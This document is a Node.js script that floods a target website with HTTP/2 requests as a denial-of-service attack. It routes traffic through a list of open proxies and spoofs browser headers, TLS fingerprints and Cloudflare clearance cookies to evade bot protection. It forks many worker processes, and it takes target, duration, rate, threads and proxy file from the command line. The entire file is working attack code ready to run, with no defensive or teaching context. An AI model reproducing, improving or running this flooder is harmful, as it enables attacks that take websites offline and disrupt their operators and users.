const net = require("net"),
    http2 = require("http2"),
    tls = require("tls"),
    cluster = require("cluster"),
    url = require("url"),
    crypto = require("crypto"),
    fs = require("fs"),
    scp = require("set-cookie-parser"),
    randomString = crypto.randomBytes(20).toString('hex');
    const secretKey = crypto.randomBytes(32);
    var ciphe= crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));
    randstr = require('randomstring');
    let encrypted = ciphe.update(randomString, 'utf8', 'hex');
    encrypted += ciphe.final('hex');
    
    const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
    const ciphers = "GREASE:" + [
        defaultCiphers[2],
        defaultCiphers[1],
        defaultCiphers[0],
        ...defaultCiphers.slice(3)
    ].join(":");

    function ra(length) {
        const rsdat = randstr.generate({
            "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
            "length": length
        });
        return rsdat;
    }
    
    function generateCookie() {
        const rsdat = randstr.generate({
            "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
            "length": 6
        });
    
        let cookie = `${rsdat}=${rsdat}; ${rsdat}=${rsdat};`;
        return cookie;
    }
    
    let cookies;

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
const sigalgs = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519";


const cookiea = "cf_clearance=" +  ra(4) + "." + ra(20) + "." + ra(40) + "-0.0.1 " + ra(20) + ";_ga=" + ra(20) + ";_gid=" + ra(15);


 const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method","TLS_client_method",],
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 function getRandomAcceptHeader() {
    const accept_header = [
        '*/*',
        'image/*',
        'image/webp,image/apng',
        'text/html',
        'application/json',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
          'text/html; charset=utf-8',
          'application/json, text/plain, */*',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
            ];
    return randomElement(accept_header);
}

cache_header = [
    'max-age=0',
    'no-cache',
    'max-age=15',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]

type = [
    "text/plain",
    "text/html",
    "application/json",
    "application/xml",
    "multipart/form-data",
    "application/octet-stream",
    "image/jpeg",
    "image/png",
    "audio/mpeg",
    "video/mp4",
    "application/javascript",
    "application/pdf",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/zip",
    "image/gif",
    "image/bmp",
    "image/tiff",
    "audio/wav",
    "audio/midi",
    "video/avi",
    "video/mpeg",
    "video/quicktime",
    "text/csv",
    "text/xml",
    "text/css",
    "text/javascript",
    "application/graphql",
    "application/x-www-form-urlencoded",
    "application/vnd.api+json",
    "application/ld+json",
    "application/x-pkcs12",
    "application/x-pkcs7-certificates",
    "application/x-pkcs7-certreqresp",
    "application/x-pem-file",
    "application/x-x509-ca-cert",
    "application/x-x509-user-cert",
    "application/x-x509-server-cert",
    "application/x-bzip",
    "application/x-gzip",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash"
  ];

function getRandomLangHeader() {
    const lang_header = [
        'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
 ];
    return randomElement(lang_header);
}
const acceptEncoding = randomElement([
        'gzip, deflate, br',
        'compress, gzip',
        'deflate, gzip',
        'gzip, identity',
        '*'
    ]);


    const refers = [
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.youtube.com/",
        "https://www.linkedin.com/",
        "https://proxyscrape.com/",
        "https://www.instagram.com/",
        "https://wwww.reddit.com/",
        "https://fivem.net/",
        "https://www.fbi.gov/",
        "https://nettruyenplus.com/",
        "https://vnexpress.net/",
        "https://zalo.me",
        "https://shopee.vn",
        "https://www.tiktok.com/",
        "https://google.com.vn/",
        "https://tuoitre.vn/",
        "https://thanhnien.vn/",
        "https://nettruyento.com/",
        "https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url=",
        "http://www.google.com/ig/add?feedurl=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://downforeveryoneorjustme.com/",
        "https://www.facebook.com/l.php?u="     
    ];
       
    country = [
        "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
        "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
        "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
        "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
        "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
        "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
        "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
        "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
        "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
        "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
        "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
        "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
        "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
        "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
        "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
        "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
      ];

    version = [
        '"Chromium";v="100", "Google Chrome";v="100"',
        '"(Not(A:Brand";v="8", "Chromium";v="98"',
        '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
        '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
        '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
        '"Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"'
     ];
    

      var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
      var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
      var type = type[Math.floor(Math.floor(Math.random() * refers.length))];
      var coun = country[Math.floor(Math.floor(Math.random() * refers.length))];

 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     method: ~~process.argv[6],
     proxyFile: process.argv[7]
 }

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

} else {for (let i = 0; i < 5; i++) { setInterval(runFlooder, 0) }}
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true)
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 } 

 function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }

 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
 const userAgents = readLines("ua.txt");

 function getRandomUserAgent() {
   return randomElement(userAgents);
 }
 

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
     let cookie = generateCookie();

     let userAgent = getRandomUserAgent();


    let headers = {
        "cookie":  cookie + cookiea,
        ":method": "GET",
        ":path": parsedTarget.path,
        ":scheme": parsedTarget.protocol == "https:" ? "https" : "http",
        "cache-control": 'no-cache, no-store,private, max-age=0, must-revalidate',
        "origin": parsedTarget.protocol + "//" + parsedTarget.host,
        "referer": Ref,
        "sec-ch-ua": ver,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform":  "Windows",
        "content_type": type,
        "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
        "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
        "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": 1,
        "sec-ch-ua-platform-version": "10.0.0",
        "CF-IPCountry": coun,
        "user-agent": userAgent,
        "Accept": getRandomAcceptHeader(),
        "accept-language": getRandomLangHeader(),
        "accept-encoding": acceptEncoding,
        "TE": "trailers",
        "upgrade-insecure-requests": "1",
        "pragma": "no-cache",
    }
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 10
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true)
 
         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ['h2','http/1.2','spdy/3.1'],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            cookie: cookie,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method","TLS_client_method",],
        };

         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: settings,
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
             //socket: connection,
         });
 
         client.setMaxListeners(0);
         client.settings(settings);
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    
                    if(client.closed && client.destroyed) {
                        break
                    }

                    const request = client.request(headers)
                    
                    .on("response", response => {
                        if(response['set-cookie']) {
                            headers['cookie'] = cookieString(scp.parse(response["set-cookie"]))

                        }
                        return
                    });
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
     });
 }
 
 const StopScript = () => process.exit(1);
 
 setTimeout(StopScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});